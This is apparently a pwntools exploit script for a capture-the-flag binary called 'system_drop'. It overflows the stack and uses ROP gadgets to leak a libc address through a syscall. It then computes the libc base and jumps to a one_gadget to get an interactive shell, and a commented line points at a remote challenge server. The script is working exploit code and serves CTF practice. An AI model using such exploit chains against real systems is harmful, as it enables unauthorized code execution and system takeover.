from pwn import *

target = process('./system_drop', env={"LD_PRELOAD":"./system_drop_libc.so"})

pid = gdb.attach(target, "\nb *main+45\n set disassembly-flavor intel\ncontinue")

#target = remote ('139.59.168.47', 31111)

elf = ELF("system_drop")
libc = ELF("system_drop_libc.so")

#Gadgets:

onegadget_offset = 0x4f432
read_got_plt = p64(0x601020)
alarm_got_plt = p64(0x601018)
main = p64(0x00400541)

pop_rdi = p64(0x00000000004005d3) # : pop rdi ; ret
pop_rsi = p64(0x00000000004005d1) # : pop rsi ; pop r15 ; ret


syscall = p64(0x000000000040053b) # : syscall

padding = b'a' * 40

payload = padding
payload += pop_rdi
payload += p64(1)
payload += pop_rsi
payload += alarm_got_plt + p64(0)
payload += syscall
payload += main


target.sendline(payload)

result = target.recvuntil(b'\x00\x00\x00', timeout = 100)
print('We got result')
print(result)
alarm_unproc = result[:8]
alarm_libc = u64(alarm_unproc)
print(hex(alarm_libc))
#The library is libc6_2.27-3ubuntu1.4_amd64

libc_base = alarm_libc - libc.symbols['alarm']
onegadget = libc_base + onegadget_offset

payload = padding

payload += p64(onegadget) + b'\x00' * 0x50

target.sendline(payload)

target.interactive()
